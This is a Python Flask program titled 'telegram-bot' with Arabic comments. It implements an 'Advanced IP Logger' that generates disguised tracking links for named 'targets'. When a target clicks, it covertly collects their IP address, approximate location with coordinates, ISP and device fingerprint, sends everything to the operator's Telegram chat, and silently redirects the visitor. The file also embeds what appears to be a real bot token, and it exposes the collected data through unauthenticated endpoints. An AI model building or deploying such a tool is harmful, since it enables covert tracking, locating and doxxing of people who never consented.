# telegram-bot
from flask import Flask, request, redirect, jsonify, render_template_string
import requests
from datetime import datetime
import json
import telebot
from user_agents import parse
import socket
import hashlib
import base64
import uuid
import os

app = Flask(__name__)

# إعدادات بوت التليجرام
TELEGRAM_BOT_TOKEN = "7584111711:AAHKUXwXswt3bJyjSvhveiS6oDUyVgOVHw4"  # ضع توكن البوت هنا
TELEGRAM_CHAT_ID = "5367853925"     # ضع معرف المحادثة هنا

# إنشاء كائن البوت
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# صفحة التحويل الافتراضية
default_redirect_url = "https://www.google.com"

# رابط الفيديو الافتراضي
default_video_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

# ملفات التخزين
log_file = "advanced_ip_logs.txt"
links_file = "tracking_links.json"

# قاموس لتخزين الروابط النشطة
active_links = {}

def load_links():
    """تحميل الروابط المحفوظة"""
    global active_links
    try:
        if os.path.exists(links_file):
            with open(links_file, 'r', encoding='utf-8') as f:
                active_links = json.load(f)
    except:
        active_links = {}

def save_links():
    """حفظ الروابط"""
    try:
        with open(links_file, 'w', encoding='utf-8') as f:
            json.dump(active_links, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Error saving links: {e}")

def create_tracking_link(target_name="", redirect_url="", video_url="", notes=""):
    """إنشاء رابط تتبع جديد"""
    link_id = str(uuid.uuid4())[:8]  # معرف قصير
    
    link_data = {
        'id': link_id,
        'target_name': target_name or "غير محدد",
        'redirect_url': redirect_url or default_redirect_url,
        'video_url': video_url or default_video_url,
        'notes': notes,
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'clicks': 0,
        'visitors': []
    }
    
    active_links[link_id] = link_data
    save_links()
    
    return link_id, link_data

def get_detailed_ip_info(ip):
    """جمع معلومات شاملة عن IP من مصادر متعددة"""
    info = {}
    
    try:
        # استخدام ipinfo.io
        response1 = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if response1.status_code == 200:
            info['ipinfo'] = response1.json()
    except:
        info['ipinfo'] = {"error": "Failed to fetch from ipinfo.io"}
    
    try:
        # استخدام ip-api.com (مجاني ومفصل أكثر)
        response2 = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=5)
        if response2.status_code == 200:
            info['ip_api'] = response2.json()
    except:
        info['ip_api'] = {"error": "Failed to fetch from ip-api.com"}
    
    return info

def get_device_info(user_agent_string):
    """تحليل معلومات الجهاز من User-Agent"""
    user_agent = parse(user_agent_string)
    
    return {
        'browser': {
            'family': user_agent.browser.family,
            'version': user_agent.browser.version_string
        },
        'os': {
            'family': user_agent.os.family,
            'version': user_agent.os.version_string
        },
        'device': {
            'family': user_agent.device.family,
            'brand': user_agent.device.brand,
            'model': user_agent.device.model
        },
        'is_mobile': user_agent.is_mobile,
        'is_tablet': user_agent.is_tablet,
        'is_pc': user_agent.is_pc,
        'is_bot': user_agent.is_bot
    }

def get_additional_headers(request):
    """جمع معلومات إضافية من headers"""
    headers_info = {}
    
    important_headers = [
        'Accept-Language', 'Accept-Encoding', 'Accept',
        'DNT', 'Upgrade-Insecure-Requests', 'Cache-Control',
        'Sec-Fetch-Site', 'Sec-Fetch-Mode', 'Sec-Fetch-User',
        'Sec-Fetch-Dest', 'Sec-Ch-Ua', 'Sec-Ch-Ua-Mobile',
        'Sec-Ch-Ua-Platform', 'X-Forwarded-For', 'X-Real-IP',
        'CF-Connecting-IP', 'X-Forwarded-Proto'
    ]
    
    for header in important_headers:
        value = request.headers.get(header)
        if value:
            headers_info[header] = value
    
    return headers_info

def create_fingerprint(ip, user_agent, headers):
    """إنشاء بصمة فريدة للزائر"""
    fingerprint_data = f"{ip}_{user_agent}_{json.dumps(headers, sort_keys=True)}"
    return hashlib.md5(fingerprint_data.encode()).hexdigest()

def send_to_telegram(message, video_link=None):
    """إرسال رسالة إلى التليجرام"""
    try:
        # إرسال الرسالة النصية
        bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode='HTML')
        
        # إرسال رابط الفيديو إذا كان متوفراً
        if video_link:
            video_message = f"🎥 <b>رابط الفيديو للهدف:</b>\n{video_link}"
            bot.send_message(TELEGRAM_CHAT_ID, video_message, parse_mode='HTML')
            
        return True
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

def format_telegram_message(link_data, ip, ip_info, device_info, headers_info, fingerprint, timestamp):
    """تنسيق الرسالة للإرسال إلى التليجرام"""
    
    # معلومات الرابط والهدف
    message = f"🎯 <b>هدف جديد تم رصده!</b>\n"
    message += f"👤 <b>اسم الهدف:</b> {link_data['target_name']}\n"
    message += f"🔗 <b>معرف الرابط:</b> <code>{link_data['id']}</code>\n"
    message += f"⏰ <b>الوقت:</b> {timestamp}\n"
    message += f"🌐 <b>IP:</b> <code>{ip}</code>\n"
    message += f"🔍 <b>البصمة:</b> <code>{fingerprint[:16]}...</code>\n"
    
    if link_data['notes']:
        message += f"📝 <b>ملاحظات:</b> {link_data['notes']}\n"
    
    message += "\n"
    
    # معلومات الموقع من ip-api.com
    if 'ip_api' in ip_info and ip_info['ip_api'].get('status') == 'success':
        api_data = ip_info['ip_api']
        message += f"📍 <b>معلومات الموقع:</b>\n"
        message += f"🌍 البلد: {api_data.get('country', 'غير معروف')} ({api_data.get('countryCode', 'N/A')})\n"
        message += f"🏙️ المدينة: {api_data.get('city', 'غير معروف')}\n"
        message += f"📍 المنطقة: {api_data.get('regionName', 'غير معروف')}\n"
        message += f"📮 الرمز البريدي: {api_data.get('zip', 'غير معروف')}\n"
        message += f"🕐 المنطقة الزمنية: {api_data.get('timezone', 'غير معروف')}\n"
        message += f"📡 مزود الخدمة: {api_data.get('isp', 'غير معروف')}\n"
        message += f"🏢 المنظمة: {api_data.get('org', 'غير معروف')}\n"
        
        if api_data.get('lat') and api_data.get('lon'):
            message += f"🗺️ الإحداثيات: {api_data['lat']}, {api_data['lon']}\n"
        
        # معلومات الأمان
        security_flags = []
        if api_data.get('proxy'):
            security_flags.append("🔒 بروكسي")
        if api_data.get('mobile'):
            security_flags.append("📱 شبكة محمولة")
        if api_data.get('hosting'):
            security_flags.append("🖥️ استضافة")
        
        if security_flags:
            message += f"⚠️ تحذيرات: {', '.join(security_flags)}\n"
    
    message += "\n"
    
    # معلومات الجهاز
    message += f"💻 <b>معلومات الجهاز:</b>\n"
    message += f"🌐 المتصفح: {device_info['browser']['family']} {device_info['browser']['version']}\n"
    message += f"💿 نظام التشغيل: {device_info['os']['family']} {device_info['os']['version']}\n"
    message += f"📱 الجهاز: {device_info['device']['family']}"
    
    if device_info['device']['brand']:
        message += f" ({device_info['device']['brand']})"
    message += "\n"
    
    # نوع الجهاز
    device_type = []
    if device_info['is_mobile']:
        device_type.append("📱 محمول")
    if device_info['is_tablet']:
        device_type.append("📟 تابلت")
    if device_info['is_pc']:
        device_type.append("💻 كمبيوتر")
    if device_info['is_bot']:
        device_type.append("🤖 بوت")
    
    if device_type:
        message += f"🔍 نوع الجهاز: {', '.join(device_type)}\n"
    
    # معلومات إضافية من Headers
    if headers_info.get('Accept-Language'):
        message += f"🌐 اللغة: {headers_info['Accept-Language']}\n"
    
    if headers_info.get('Sec-Ch-Ua-Platform'):
        message += f"⚙️ المنصة: {headers_info['Sec-Ch-Ua-Platform']}\n"
    
    # إحصائيات الرابط
    message += f"\n📊 <b>إحصائيات الرابط:</b>\n"
    message += f"👥 عدد النقرات: {link_data['clicks']}\n"
    message += f"🆔 زوار فريدون: {len(set([v['fingerprint'] for v in link_data['visitors']]))}\n"
    
    return message

@app.route('/')
def home():
    """الصفحة الرئيسية لإدارة الروابط"""
    html_template = """
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advanced IP Logger - إدارة الروابط</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { text-align: center; color: #333; margin-bottom: 30px; }
            .form-group { margin-bottom: 15px; }
            label { display: block; margin-bottom: 5px; font-weight: bold; }
            input, textarea { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
            button { background: #007bff; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            button:hover { background: #0056b3; }
            .link-item { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }
            .link-url { background: #e9ecef; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; }
            .stats { display: inline-block; margin: 5px 10px 5px 0; padding: 5px 10px; background: #28a745; color: white; border-radius: 3px; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 Advanced IP Logger</h1>
                <p>نظام متقدم لتتبع الزوار وجمع المعلومات</p>
            </div>
            
            <h2>إنشاء رابط تتبع جديد</h2>
            <form action="/create_link" method="post">
                <div class="form-group">
                    <label>اسم الهدف:</label>
                    <input type="text" name="target_name" placeholder="مثال: أحمد محمد">
                </div>
                <div class="form-group">
                    <label>رابط التحويل:</label>
                    <input type="url" name="redirect_url" placeholder="https://www.google.com">
                </div>
                <div class="form-group">
                    <label>رابط الفيديو:</label>
                    <input type="url" name="video_url" placeholder="https://www.youtube.com/watch?v=...">
                </div>
                <div class="form-group">
                    <label>ملاحظات:</label>
                    <textarea name="notes" rows="3" placeholder="أي ملاحظات إضافية..."></textarea>
                </div>
                <button type="submit">إنشاء رابط تتبع</button>
            </form>
            
            <h2>الروابط النشطة</h2>
            {% for link_id, link_data in links.items() %}
            <div class="link-item">
                <h3>👤 {{ link_data.target_name }}</h3>
                <div class="link-url">
                    <strong>الرابط:</strong> {{ request.host_url }}track/{{ link_id }}
                </div>
                <div style="margin: 10px 0;">
                    <span class="stats">👥 {{ link_data.clicks }} نقرة</span>
                    <span class="stats">🆔 {{ link_data.visitors|length }} زائر</span>
                    <span class="stats">📅 {{ link_data.created_at }}</span>
                </div>
                {% if link_data.notes %}
                <p><strong>ملاحظات:</strong> {{ link_data.notes }}</p>
                {% endif %}
            </div>
            {% endfor %}
        </div>
    </body>
    </html>
    """
    return render_template_string(html_template, links=active_links, request=request)

@app.route('/create_link', methods=['POST'])
def create_link():
    """إنشاء رابط تتبع جديد"""
    target_name = request.form.get('target_name', '')
    redirect_url = request.form.get('redirect_url', '')
    video_url = request.form.get('video_url', '')
    notes = request.form.get('notes', '')
    
    link_id, link_data = create_tracking_link(target_name, redirect_url, video_url, notes)
    
    # إرسال إشعار للتليجرام
    message = f"🔗 <b>رابط تتبع جديد تم إنشاؤه!</b>\n"
    message += f"👤 <b>الهدف:</b> {link_data['target_name']}\n"
    message += f"🆔 <b>معرف الرابط:</b> <code>{link_id}</code>\n"
    message += f"🔗 <b>الرابط:</b> <code>{request.host_url}track/{link_id}</code>\n"
    message += f"📅 <b>تاريخ الإنشاء:</b> {link_data['created_at']}\n"
    
    if notes:
        message += f"📝 <b>ملاحظات:</b> {notes}\n"
    
    send_to_telegram(message)
    
    return redirect('/')

@app.route('/track/<link_id>')
def track_visitor(link_id):
    """تتبع الزائر عبر الرابط المخصص"""
    if link_id not in active_links:
        return "رابط غير صحيح", 404
    
    link_data = active_links[link_id]
    
    # جمع معلومات أساسية
    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', '')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # جمع معلومات مفصلة
    ip_info = get_detailed_ip_info(ip)
    device_info = get_device_info(user_agent)
    headers_info = get_additional_headers(request)
    fingerprint = create_fingerprint(ip, user_agent, headers_info)
    
    # تحديث إحصائيات الرابط
    link_data['clicks'] += 1
    
    # إضافة معلومات الزائر
    visitor_data = {
        'timestamp': timestamp,
        'ip': ip,
        'fingerprint': fingerprint,
        'user_agent': user_agent,
        'ip_info': ip_info,
        'device_info': device_info,
        'headers_info': headers_info
    }
    
    link_data['visitors'].append(visitor_data)
    
    # حفظ التحديثات
    save_links()
    
    # إنشاء سجل مفصل
    log_data = {
        'link_id': link_id,
        'target_name': link_data['target_name'],
        'timestamp': timestamp,
        'ip': ip,
        'fingerprint': fingerprint,
        'user_agent': user_agent,
        'ip_info': ip_info,
        'device_info': device_info,
        'headers_info': headers_info,
        'request_info': {
            'method': request.method,
            'url': request.url,
            'referrer': request.referrer,
            'endpoint': request.endpoint,
            'remote_addr': request.remote_addr
        }
    }
    
    # حفظ في ملف السجل
    with open(log_file, "a", encoding='utf-8') as f:
        f.write(json.dumps(log_data, ensure_ascii=False, indent=2) + "\n" + "="*50 + "\n")
    
    # طباعة في الكونسول
    print(f"[{timestamp}] Target '{link_data['target_name']}' accessed link {link_id}: {ip}")
    
    # إرسال إلى التليجرام
    telegram_message = format_telegram_message(link_data, ip, ip_info, device_info, headers_info, fingerprint, timestamp)
    send_to_telegram(telegram_message, link_data['video_url'])
    
    # إعادة التوجيه
    return redirect(link_data['redirect_url'])

@app.route('/stats')
def stats():
    """صفحة الإحصائيات"""
    total_links = len(active_links)
    total_clicks = sum(link['clicks'] for link in active_links.values())
    total_visitors = sum(len(link['visitors']) for link in active_links.values())
    
    return jsonify({
        'total_links': total_links,
        'total_clicks': total_clicks,
        'total_visitors': total_visitors,
        'active_links': active_links,
        'last_updated': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

@app.route('/api/links')
def api_links():
    """API لعرض جميع الروابط"""
    return jsonify(active_links)

if __name__ == '__main__':
    print("🚀 Advanced IP Logger with Link Management starting...")
    print("📝 Make sure to update TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
    print("🔗 Access the admin panel at: http://localhost:5000/")
    
    # تحميل الروابط المحفوظة
    load_links()
    
    app.run(host="0.0.0.0", port=5000, debug=True)


